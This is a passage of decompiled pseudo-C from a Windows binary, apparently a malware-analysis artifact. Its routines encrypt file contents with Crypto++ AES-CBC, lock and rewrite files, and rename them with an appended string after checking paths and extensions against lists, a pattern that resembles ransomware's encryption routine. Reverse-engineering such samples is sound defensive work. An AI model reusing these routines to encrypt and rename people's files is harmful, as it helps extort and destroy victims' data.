            v13 = v25;
            v14 = v27;
            v15 = (LPCVOID *)v25[0];
            if ( v27 >= 0x10 )
              v13 = (LPCVOID *)v25[0];
            while ( 1 )
            {
              v16 = v25;
              if ( v14 >= 0x10 )
                v16 = v15;
              if ( v13 == (LPCVOID *)((char *)v16 + nNumberOfBytesToWrite) )
                break;
              v17 = *(_BYTE *)v13;
              LOBYTE(v39) = *(_BYTE *)v13;
              if ( v12 == (char *)v2 )
              {
                sub_409919(&NewFileName[3], (int)v12, v12, (char *)&v39);
                v12 = (char *)NewFileName[4];
                v2 = NewFileName[5];
              }
              else
              {
                *v12++ = v17;
                NewFileName[4] = (wchar_t *)v12;
              }
              v14 = v27;
              v13 = (LPCVOID *)((char *)v13 + 1);
              v15 = (LPCVOID *)v25[0];
            }
            sub_402A03((void **)&NewFileName[3], v12, v28, v29, (int)lpFileName);
            LOBYTE(v2) = 0;
            if ( !sub_40A887(&hFile, NewFileName[3], (char *)NewFileName[4] - (char *)NewFileName[3]) )
            {
              sub_401B42((int)&NewFileName[3]);
              goto LABEL_29;
            }
            LOBYTE(v40) = 2;
            sub_401B42((int)&NewFileName[3]);
          }
          v20 = hFile;
          if ( v38 )
            UnlockFile(hFile, 0, 0, nNumberOfBytesToUnlockLow, nNumberOfBytesToUnlockHigh);
          v21 = CloseHandle(v20);
          FileW = -1;
          hFile = (HANDLE)-1;
          if ( v21 )
          {
            sub_401C9F((int)v24, lpFileName);
            LOBYTE(v40) = 4;
            v22 = std::wstring::append(v35 + 48);
            std::wstring::wstring(v22);
            unknown_libname_3(v24);
            v23 = (const wchar_t *)NewFileName;
            if ( NewFileName[5] >= (wchar_t *)8 )
              v23 = NewFileName[0];
            _wrename(lpFileName, v23);
            unknown_libname_3(NewFileName);
          }
          LOBYTE(v2) = 1;
          goto LABEL_30;
        }
      }
    }
  }
LABEL_32:
  if ( FileW != -1 )
    CloseHandle((HANDLE)FileW);
  return (char)v2;
}
// 407B7E: conditional instruction was optimized away because ebx.4==0
// 407C36: conditional instruction was optimized away because ebx.4==0
// 407BA9: variable 'v8' is possibly undefined
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);

//----- (00407DF2) --------------------------------------------------------
char __userpurge sub_407DF2@<al>(int a1@<ecx>, _DWORD *a2@<ebx>, int a3@<edi>, int a4@<esi>, int a5)
{
  int v6; // edi
  int v7; // edi
  int v8; // eax
  void *v9; // edi
  _DWORD *v10; // eax
  int v11; // eax
  void *v12; // edi
  _DWORD *v13; // eax
  int v15; // [esp-24h] [ebp-1DCh]
  int v16; // [esp-24h] [ebp-1DCh]
  _DWORD v17[8]; // [esp-20h] [ebp-1D8h] BYREF
  void **v18; // [esp+0h] [ebp-1B8h] BYREF
  int v19[11]; // [esp+4h] [ebp-1B4h] BYREF
  _DWORD v20[76]; // [esp+30h] [ebp-188h] BYREF
  void *v21[14]; // [esp+160h] [ebp-58h] BYREF
  void *Src; // [esp+198h] [ebp-20h]
  void *Block; // [esp+19Ch] [ebp-1Ch]
  _DWORD *v24; // [esp+1A8h] [ebp-10h]
  int v25; // [esp+1B4h] [ebp-4h]

  Src = (void *)a1;
  v21[13] = a2;
  v25 = 0;
  v17[2] = a2;
  v17[1] = a4;
  v17[0] = a3;
  v24 = v17;
  sub_409102(v20);
  LOBYTE(v25) = 1;
  sub_408B44(&v18);
  LOBYTE(v25) = 2;
  v18 = &CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable';
  v19[0] = (int)&CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable';
  v19[1] = (int)v20;
  sub_41D1F1(&v18);
  LOBYTE(v25) = 3;
  v6 = *(_DWORD *)(a1 + 172);
  Block = *(void **)(a1 + 168);
  v7 = v6 - (_DWORD)Block;
  Src = *(void **)(a1 + 156);
  v8 = ((int (__thiscall *)(void ***))v18[8])(&v18);
  sub_40DA77((int *)&v18, (int)Block, v7, Src, v8);
  if ( (unsigned int)(*(_DWORD *)(a1 + 148) - *(_DWORD *)(a1 + 144)) >= 0x3200000 )
  {
    v12 = operator new(0x78u);
    Block = v12;
    LOBYTE(v25) = 6;
    Src = operator new(0x10u);
    v16 = a2[2];
    LOBYTE(v25) = 7;
    v13 = sub_408790(Src, v16);
    LOBYTE(v25) = 6;
    v11 = sub_41D546((int)v12, (int)v19, (int)v13, 0);
  }
  else
  {
    v9 = operator new(0x78u);
    Block = v9;
    LOBYTE(v25) = 4;
    Src = operator new(0x10u);
    v15 = a2[2];
    LOBYTE(v25) = 5;
    v10 = sub_408790(Src, v15);
    LOBYTE(v25) = 4;
    v11 = sub_41D546((int)v9, (int)v19, (int)v10, 5);
  }
  LOBYTE(v25) = 3;
  sub_406F92(v21, *(void **)(a1 + 144), *(_DWORD *)(a1 + 148) - *(_DWORD *)(a1 + 144), *(_DWORD *)(a1 + 144), v11);
  sub_4086B6(v21);
  sub_406D59((int)&v18);
  sub_407F9E((int)v20);
  return 1;
}
// 47EC7C: using guessed type void *CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable';
// 47F110: using guessed type void *CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable';
// 407DF2: using guessed type _DWORD var_188[76];

//----- (00407F9E) --------------------------------------------------------
void *__thiscall sub_407F9E(int this)
{
  unsigned int v2; // eax
  unsigned int v3; // ecx
  void *v4; // edx

  v2 = *(_DWORD *)(this + 292);
  v3 = *(_DWORD *)(this + 296);
  v4 = *(void **)(this + 300);
  if ( v2 < v3 )
    v3 = v2;
  memset(*(void **)(this + 300), 0, v3);
  j_j___free_base(v4);
  return sub_408A58(this + 16);
}

//----- (00407FFF) --------------------------------------------------------
int __stdcall sub_407FFF(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 *v4; // [esp+18h] [ebp-18h]
  int v5[2]; // [esp+1Ch] [ebp-14h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  sub_40BD6F(v5);
  v4 = (unsigned __int8 *)sub_420BF0(4u);
  v6 = 0;
  (*(void (__thiscall **)(int *, int, int))(v5[0] + 12))(v5, a1, 4);
  (*(void (__thiscall **)(int *, unsigned __int8 *))(v5[0] + 20))(v5, v4);
  v2 = ((v4[2] | ((v4[1] | (*v4 << 8)) << 8)) << 8) | v4[3];
  v6 = 1;
  memset(v4, 0, 4u);
  j_j___free_base(v4);
  return v2;
}

//----- (00408090) --------------------------------------------------------
char __thiscall sub_408090(_DWORD *this, LPCWSTR lpString1)
{
  int v4; // esi
  const WCHAR *v5; // eax
  const WCHAR *ExtensionW; // ebx
  int v7; // esi
  int v8; // edi
  const WCHAR *v9; // eax
  LPCWSTR lpString1a; // [esp+14h] [ebp+8h]

  if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 4))(this) || !lpString1 )
    return 0;
  v4 = this[5];
  lpString1a = (LPCWSTR)this[6];
  if ( (LPCWSTR)v4 == lpString1a )
  {
LABEL_8:
    ExtensionW = PathFindExtensionW(lpString1);
    if ( ExtensionW )
    {
      v7 = this[2];
      v8 = this[3];
      while ( v7 != v8 )
      {
        v9 = (const WCHAR *)v7;
        if ( *(_DWORD *)(v7 + 20) >= 8u )
          v9 = *(const WCHAR **)v7;
        if ( !lstrcmpiW(ExtensionW, v9) )
          return 1;
        v7 += 24;
      }
    }
    return 0;
  }
  while ( 1 )
  {
    v5 = (const WCHAR *)v4;
    if ( *(_DWORD *)(v4 + 20) >= 8u )
      v5 = *(const WCHAR **)v4;
    if ( !lstrcmpiW(lpString1, v5) )
      return 1;
    v4 += 24;
    if ( (LPCWSTR)v4 == lpString1a )
      goto LABEL_8;
  }
}

//----- (00408112) --------------------------------------------------------
char __stdcall sub_408112(int a1, int a2)
{
  return 0;
}

//----- (00408117) --------------------------------------------------------
char __thiscall sub_408117(_DWORD *this, void *a2, void *a3)
{
  int v4; // ecx
  int *v5; // esi
  _DWORD *v6; // eax
  void *Src[9]; // [esp+8h] [ebp-24h] BYREF

  v4 = this[2];
  if ( (unsigned int)((*(_DWORD *)(v4 + 4) - *(_DWORD *)v4) / 24) >= 0x1388 )
  {
    sub_407733((const void **)v4);
  }
  else
  {
    sub_401C9F((int)Src, a2);
    Src[8] = 0;
    sub_401C17(Src, (void *)&word_47EA8C);
    sub_401C17(Src, a3);
    v5 = (int *)this[2];
    v6 = (_DWORD *)v5[1];
    if ( v6 == (_DWORD *)v5[2] )
    {
      sub_4020F2(v5, v5[1], Src);
    }
    else
    {
      v6[4] = 0;
      v6[5] = 0;
      sub_401EE0(v6, Src);
      v5[1] += 24;
    }
    unknown_libname_3(Src);
  }
  return 0;
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);

//----- (004081B0) --------------------------------------------------------
char __thiscall sub_4081B0(_DWORD *this, LPCWSTR lpString1)
{
  int v3; // esi
  int v4; // edi
  const WCHAR *v5; // eax

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 4))(this) && lpString1 )
  {
    v3 = this[2];
    v4 = this[3];
    while ( v3 != v4 )
    {
      v5 = (const WCHAR *)v3;
      if ( *(_DWORD *)(v3 + 20) >= 8u )
        v5 = *(const WCHAR **)v3;
      if ( !lstrcmpiW(lpString1, v5) )
        return 1;
      v3 += 24;
    }
  }
  return 0;
}

//----- (004081F9) --------------------------------------------------------
int __thiscall sub_4081F9(_DWORD *this)
{
  const WCHAR *v1; // eax
  HANDLE FileW; // esi
  LPSTR *v3; // eax
  const void *v4; // edi
  LPSTR *v5; // eax
  _DWORD v7[6]; // [esp+8h] [ebp-40h] BYREF
  LPCWSTR lpFileName[6]; // [esp+20h] [ebp-28h] BYREF
  HANDLE v9; // [esp+38h] [ebp-10h] BYREF
  int v10; // [esp+44h] [ebp-4h]

  sub_405A3F((int)v7, this, (char *)&word_47EA8C);
  v10 = 0;
  sub_4097F9((int)lpFileName, v7, dword_48CCD4);
  LOBYTE(v10) = 2;
  v1 = (const WCHAR *)lpFileName;
  if ( lpFileName[5] >= (LPCWSTR)8 )
    v1 = lpFileName[0];
  FileW = CreateFileW(v1, 0xC0000000, 1u, 0, 1u, 0x80u, 0);
  v9 = FileW;
  if ( FileW != (HANDLE)-1 )
  {
    v3 = sub_401AC0();
    v4 = v3;
    if ( (unsigned int)v3[5] >= 0x10 )
      v4 = *v3;
    v5 = sub_401AC0();
    sub_40A887(&v9, v4, (DWORD)(v5[4] - 2));
    CloseHandle(FileW);
  }
  unknown_libname_3(lpFileName);
  return unknown_libname_3(v7);
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 48CCD4: using guessed type _DWORD dword_48CCD4[6];
// 4081F9: using guessed type _DWORD var_40[6];

//----- (004082A8) --------------------------------------------------------
int __stdcall sub_4082A8(int a1)
{
  int v1; // eax
  int v2; // eax
  char v4[24]; // [esp+0h] [ebp-3Ch] BYREF
  char v5[16]; // [esp+18h] [ebp-24h] BYREF
  int v6; // [esp+28h] [ebp-14h]
  int v7; // [esp+2Ch] [ebp-10h]
  int v8; // [esp+38h] [ebp-4h]

  v6 = 0;
  v7 = 15;
  v5[0] = 0;
  unknown_libname_15("AES");
  v8 = 1;
  v1 = unknown_libname_13("/");
  std::string::string(v1);
  v2 = unknown_libname_13("CBC");
  std::string::string(v2);
  unknown_libname_5(v4);
  unknown_libname_5(v5);
  return a1;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);
// 4082A8: using guessed type char var_24[16];
// 4082A8: using guessed type char var_3C[24];

//----- (00408326) --------------------------------------------------------
_DWORD *__thiscall sub_408326(void *this)
{
  int v2; // edi
  int v3; // edx
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+8h] [ebp-10h]

  Block = operator new(0x130u);
  v2 = 0;
  v4 = sub_408B76(Block, v3, (int)this - 4);
  if ( v4 )
    return v4 + 1;
  return (_DWORD *)v2;
}
// 40834E: variable 'v3' is possibly undefined

//----- (0040836A) --------------------------------------------------------
char *__thiscall sub_40836A(char *this)
{
  return this + 12;
}

//----- (0040836E) --------------------------------------------------------
int __thiscall sub_40836E(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 32))(this - 2);
}

//----- (00408376) --------------------------------------------------------
int sub_408376()
{
  return sub_40985F();
}

//----- (00408384) --------------------------------------------------------
int __thiscall sub_408384(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 32))(this - 1) + 8;
}

//----- (00408390) --------------------------------------------------------
int __thiscall sub_408390(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 36))(this - 1) + 8;
}

//----- (0040839C) --------------------------------------------------------
int __stdcall sub_40839C(int a1)
{
  sub_409072(a1);
  return a1;
}

//----- (004083AF) --------------------------------------------------------
char __fastcall sub_4083AF(int a1)
{
  unsigned int v1; // edx
  unsigned int v2; // esi
  void *v3; // edi
  void *v4; // eax

  v1 = *(_DWORD *)(a1 + 52);
  v2 = *(_DWORD *)(a1 + 48);
  v3 = *(void **)(a1 + 56);
  v4 = (void *)(a1 + (-a1 & 0xF));
  if ( v3 == v4 )
  {
    *(_BYTE *)(a1 + 41) = 0;
    if ( v2 < v1 )
      v1 = v2;
    LOBYTE(v4) = 0;
    memset(v3, 0, v1);
  }
  return (char)v4;
}

//----- (00408403) --------------------------------------------------------
int __thiscall sub_408403(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 4))(this - 2);
}

//----- (0040840F) --------------------------------------------------------
int __thiscall sub_40840F(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 12))(this - 2);
}

//----- (0040841B) --------------------------------------------------------
_DWORD *sub_40841B()
{
  _DWORD *result; // eax

  result = operator new(4u);
  *result = &CryptoPP::P1363_MGF1::`vftable';
  return result;
}
// 46CE68: using guessed type void *CryptoPP::P1363_MGF1::`vftable';

//----- (0040842A) --------------------------------------------------------
_DWORD *sub_40842A()
{
  _DWORD *result; // eax
  _DWORD *Block; // [esp+4h] [ebp-10h]

  Block = operator new(0xC0u);
  sub_409123((int)Block);
  result = Block;
  *Block = &CryptoPP::SHA1::`vftable';
  return result;
}
// 46CCA4: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (00408466) --------------------------------------------------------
int sub_408466()
{
  return 20;
}

//----- (0040846A) --------------------------------------------------------
int __thiscall sub_40846A(_DWORD *this)
{
  return this[46];
}

//----- (00408471) --------------------------------------------------------
_DWORD *__thiscall sub_408471(_DWORD **this)
{
  return sub_420F4A(this[46]);
}

//----- (0040847E) --------------------------------------------------------
__m128i *__thiscall sub_40847E(int **this, int *a2)
{
  return sub_423C52(this[46], a2);
}

//----- (00408495) --------------------------------------------------------
_DWORD *__thiscall sub_408495(void *this)
{
  _DWORD *v3; // [esp+8h] [ebp-4h]

  v3 = operator new(0xC0u);
  sub_408CF9(v3, (int)this);
  *v3 = &CryptoPP::SHA1::`vftable';
  return v3;
}
// 46CCA4: using guessed type void *CryptoPP::SHA1::`vftable';

//----- (004084C1) --------------------------------------------------------
int __stdcall sub_4084C1(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  unknown_libname_15("SHA-1");
  return a1;
}

//----- (004084E9) --------------------------------------------------------
int __thiscall sub_4084E9(_DWORD *this)
{
  return this[24];
}

//----- (004084ED) --------------------------------------------------------
int sub_4084ED()
{
  return 64;
}

//----- (004084F1) --------------------------------------------------------
unsigned int __thiscall sub_4084F1(_DWORD *this)
{
  int v1; // eax
  int *v2; // eax
  unsigned int v3; // esi
  char v5[4]; // [esp+4h] [ebp-24h] BYREF
  char v6[20]; // [esp+8h] [ebp-20h] BYREF
  int v7; // [esp+24h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (int *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 16))(v1, v5);
  v7 = 0;
  v3 = sub_410FD0(v2);
  sub_40891D((int)v6);
  return v3;
}
// 4084F1: using guessed type char var_24[4];
// 4084F1: using guessed type char var_20[20];

//----- (00408536) --------------------------------------------------------
int __thiscall sub_408536(_DWORD *this)
{
  int *v2; // esi
  int v3; // edi
  unsigned int v4; // eax

  v2 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v3 = *v2;
  v4 = sub_4091D2(this);
  return (*(int (__thiscall **)(int *, unsigned int))(v3 + 8))(v2, v4);
}

//----- (00408558) --------------------------------------------------------
int __thiscall sub_408558(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (0040856B) --------------------------------------------------------
int __thiscall sub_40856B(void *this, unsigned int a2)
{
  if ( a2 > (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this) )
    return 0;
  else
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this);
}

//----- (0040858B) --------------------------------------------------------
int __thiscall sub_40858B(void *this, int a2)
{
  if ( a2 == (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this) )
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  else
    return 0;
}

//----- (004085AB) --------------------------------------------------------
int __thiscall sub_4085AB(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 56))(this + 6);
}

//----- (004085B3) --------------------------------------------------------
int __thiscall sub_4085B3(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 52))(this + 6);
}

//----- (004085BF) --------------------------------------------------------
bool __thiscall sub_4085BF(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 6;
  return !(*(unsigned __int8 (__thiscall **)(_DWORD *))(this[6] + 64))(this + 6)
      && !(*(unsigned __int8 (__thiscall **)(_DWORD *))(*v1 + 96))(v1);
}

//----- (004085E1) --------------------------------------------------------
int __thiscall sub_4085E1(int *this, int a2)
{
  void *v3; // eax

  v3 = (void *)(*(int (__thiscall **)(int *))(*this + 164))(this);
  return sub_40E036(this + 6, v3, (int)&unk_48CD68, a2);
}

//----- (00408605) --------------------------------------------------------
int __thiscall sub_408605(int *this, unsigned int *a2, int a3)
{
  void *v4; // eax

  v4 = (void *)(*(int (__thiscall **)(int *))(*this + 164))(this);
  return sub_40E0AB(this + 6, v4, a2, (int)&unk_48CD68, a3);
}

//----- (0040862C) --------------------------------------------------------
int __thiscall sub_40862C(_DWORD *this, int a2, int a3)
{
  _DWORD *v3; // esi
  int v4; // edi
  int v5; // eax

  v3 = this + 6;
  v4 = this[6];
  v5 = (*(int (__thiscall **)(_DWORD *, int, void *, int))(*this + 164))(this, a2, &unk_48CD68, a3);
  return (*(int (__thiscall **)(_DWORD *, int))(v4 + 124))(v3, v5);
}

//----- (00408655) --------------------------------------------------------
int __thiscall sub_408655(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[6] + 28))(this + 6);
}

//----- (00408661) --------------------------------------------------------
_DWORD *__thiscall sub_408661(_DWORD *this, int a2)
{
  sub_41D430(this, 0);
  sub_41D8CB(this, a2);
  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  sub_406DE8(this + 6, 0);
  return this;
}
// 46E27C: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 46E34C: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (004086B6) --------------------------------------------------------
int __thiscall sub_4086B6(_DWORD *this)
{
  *this = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  this[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  return sub_405EEF(this + 3);
}
// 46E27C: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 46E34C: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';

//----- (004086CB) --------------------------------------------------------
void __noreturn sub_4086CB()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-28h] BYREF

  sub_40900F(pExceptionObject);
  _CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__);
}
// 4086CB: using guessed type void __noreturn sub_4086CB();
// 4086CB: using guessed type _DWORD pExceptionObject[10];

//----- (004086E8) --------------------------------------------------------
int __thiscall sub_4086E8(_DWORD *this, void *a2, size_t Size, int a4, int a5)
{
  void **v6; // ecx
  void **v7; // edx
  size_t v8; // edi

  if ( Size )
  {
    v6 = (void **)this[3];
    v7 = v6;
    v8 = (size_t)v6[4];
    if ( Size < v8 && v8 + Size > (unsigned int)v6[5] )
    {
      sub_4093D7(v6, 2 * v8);
      v7 = (void **)this[3];
    }
    sub_40559D(v7, a2, Size);
  }
  return 0;
}

//----- (0040872B) --------------------------------------------------------
int __thiscall sub_40872B(void *this, int a2)
{
  int result; // eax
  _DWORD pExceptionObject[10]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+2Ch] [ebp-24h] BYREF

  result = (*(int (__thiscall **)(int, const char *, void ***, int))(*(_DWORD *)a2 + 4))(
             a2,
             "OutputStringPointer",
             &std::string * `RTTI Type Descriptor',
             (int)this + 12);
  if ( !(_BYTE)result )
  {
    sub_404FA6(Src, "StringSink: OutputStringPointer not specified");
    Src[8] = 0;
    sub_40637F(pExceptionObject, Src);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 48FB60: using guessed type void **std::string * `RTTI Type Descriptor';
// 40872B: using guessed type _DWORD pExceptionObject[10];

//----- (00408790) --------------------------------------------------------
_DWORD *__thiscall sub_408790(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_40CAC3(this, 0);
  this[3] = a2;
  result = this;
  *this = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  this[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
  return result;
}
// 46E1B8: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';
// 46E26C: using guessed type void *CryptoPP::StringSinkTemplate<std::string>::`vftable';

//----- (004087B7) --------------------------------------------------------
char __thiscall sub_4087B7(void *this, int a2, int a3, int a4, int a5)
{
  int v6; // ecx
  _DWORD pExceptionObject[10]; // [esp+4h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+2Ch] [ebp-24h] BYREF

  if ( (_BYTE)a3 && !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 188))(this) )
  {
    sub_404FA6(Src, "Unflushable<T>: this object has buffered input that cannot be flushed");
    Src[8] = 0;
    sub_4063C6(pExceptionObject, Src);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVCannotFlush_CryptoPP__);
  }
  v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
  if ( v6 && a4 )
    return (*(int (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 144))(v6, a2, a3, a4 - 1, a5);
  else
    return 0;
}
// 4087B7: using guessed type _DWORD pExceptionObject[10];

//----- (00408842) --------------------------------------------------------
int __thiscall sub_408842(void *this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(void *, void *, int, int, int))(*(_DWORD *)this + 144))(this, &unk_48CD68, a2, a3, a4);
}

//----- (0040885F) --------------------------------------------------------
_DWORD *__thiscall sub_40885F(void *this, _DWORD *a2)
{
  return sub_408D85(a2, (int)this);
}

//----- (0040886F) --------------------------------------------------------
char __thiscall sub_40886F(int *this, void *Src, char *a3, _DWORD *a4)
{
  int *v4; // esi
  char result; // al

  v4 = this + 4;
  if ( __std_type_info_compare(&dword_48FE18, &dword_490750) || (result = sub_40F4DF(a3, (int)a4, v4)) == 0 )
  {
    sub_406577(Src, (char *)&CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', (int)a3);
    return (unsigned __int8)sub_408DF8(a4, (int)v4);
  }
  return result;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 48FE18: using guessed type int dword_48FE18;
// 490750: using guessed type int dword_490750;

//----- (004088BF) --------------------------------------------------------
_DWORD *__thiscall sub_4088BF(void *this, _DWORD *a2)
{
  return sub_408E24(a2, (int)this);
}

//----- (004088CF) --------------------------------------------------------
char __thiscall sub_4088CF(int *this, void *Src, char *a3, int *a4)
{
  int v5; // eax

  if ( __std_type_info_compare(&dword_490750, &dword_490750)
    || (LOBYTE(v5) = sub_40F4DF(a3, (int)a4, this + 4), !(_BYTE)v5) )
  {
    sub_406577(Src, (char *)&int `RTTI Type Descriptor', (int)a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 49074C: using guessed type int int `RTTI Type Descriptor';
// 490750: using guessed type int dword_490750;

//----- (0040891D) --------------------------------------------------------
void __thiscall sub_40891D(int this)
{
  unsigned int v1; // eax

  v1 = *(_DWORD *)(this + 8);
  if ( *(_DWORD *)(this + 4) < v1 )
    v1 = *(_DWORD *)(this + 4);
  sub_409348(*(void **)(this + 12), v1);
}

//----- (00408954) --------------------------------------------------------
void __thiscall sub_408954(int this)
{
  unsigned int v1; // eax

  v1 = *(_DWORD *)(this + 8);
  if ( *(_DWORD *)(this + 4) < v1 )
    v1 = *(_DWORD *)(this + 4);
  sub_40921E(*(void **)(this + 12), v1);
}

//----- (0040898B) --------------------------------------------------------
void *__thiscall sub_40898B(int this, size_t Size)
{
  void *result; // eax

  result = sub_4099B2(this, *(void **)(this + 12), *(_DWORD *)(this + 8), Size, 0);
  *(_DWORD *)(this + 8) = Size;
  *(_DWORD *)(this + 4) = -1;
  *(_DWORD *)(this + 12) = result;
  return result;
}

//----- (004089B9) --------------------------------------------------------
void *__thiscall sub_4089B9(_DWORD *this, void *Src, size_t Size)
{
  void *result; // eax
  void *v5; // ecx

  result = sub_40898B((int)this, Size);
  v5 = (void *)this[3];
  if ( v5 && Src )
    result = (void *)sub_40622B(v5, this[2], Src, Size);
  this[1] = -1;
  return result;
}

//----- (004089EF) --------------------------------------------------------
void __thiscall sub_4089EF(_DWORD *this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = this[2];
  v2 = (void *)this[3];
  if ( this[1] < v1 )
    v1 = this[1];
  memset(v2, 0, v1);
  j_j___free_base(v2);
}

//----- (00408A33) --------------------------------------------------------
_DWORD *__thiscall sub_408A33(_DWORD *this, size_t Size)
{
  void *v2; // eax

  v2 = (void *)Size;
  this[1] = -1;
  this[2] = Size;
  if ( Size )
    v2 = sub_420BF0(Size);
  this[3] = v2;
  return this;
}

//----- (00408A58) --------------------------------------------------------
void *__thiscall sub_408A58(int this)
{
  unsigned int v1; // edx

  v1 = *(_DWORD *)(this + 260);
  if ( *(_DWORD *)(this + 256) < v1 )
    v1 = *(_DWORD *)(this + 256);
  return sub_4092FE(this, v1, *(void **)(this + 264), v1);
}

//----- (00408A76) --------------------------------------------------------
int sub_408A76()
{
  return 16;
}

//----- (00408A7A) --------------------------------------------------------
int __stdcall sub_408A7A(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  unknown_libname_15("AES");
  return a1;
}

//----- (00408AA2) --------------------------------------------------------
int __stdcall sub_408AA2(unsigned int a1)
{
  return sub_409325(a1);
}

//----- (00408AB2) --------------------------------------------------------
int sub_408AB2()
{
  return 32;
}

//----- (00408AB6) --------------------------------------------------------
int __thiscall sub_408AB6(_DWORD *this)
{
  return this[3];
}

//----- (00408ABA) --------------------------------------------------------
int __thiscall sub_408ABA(_DWORD *this, int a2)
{
  int result; // eax

  result = a2;
  this[3] = a2;
  return result;
}

//----- (00408AC7) --------------------------------------------------------
void __noreturn sub_408AC7()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-28h] BYREF

  sub_408FAC(pExceptionObject);
  _CxxThrowException(
    pExceptionObject,
    (_ThrowInfo *)&_TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__);
}
// 408AC7: using guessed type void __noreturn sub_408AC7();
// 408AC7: using guessed type _DWORD pExceptionObject[10];

//----- (00408AE4) --------------------------------------------------------
int __thiscall sub_408AE4(_Mtx_t *this)
{
  int v1; // eax

  v1 = _Mtx_unlock(*this);
  return std::_Check_C_return(v1);
}

//----- (00408B17) --------------------------------------------------------
void *__thiscall sub_408B17(void *Block, char a2)
{
  sub_406D59((int)Block);
  sub_407F9E((int)Block + 48);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00408B44) --------------------------------------------------------
_DWORD *__thiscall sub_408B44(_DWORD *this)
{
  _DWORD *result; // eax

  sub_406CDE(this);
  this[8] = -1;
  result = this;
  this[9] = 0;
  this[10] = 0;
  return result;
}

//----- (00408B76) --------------------------------------------------------
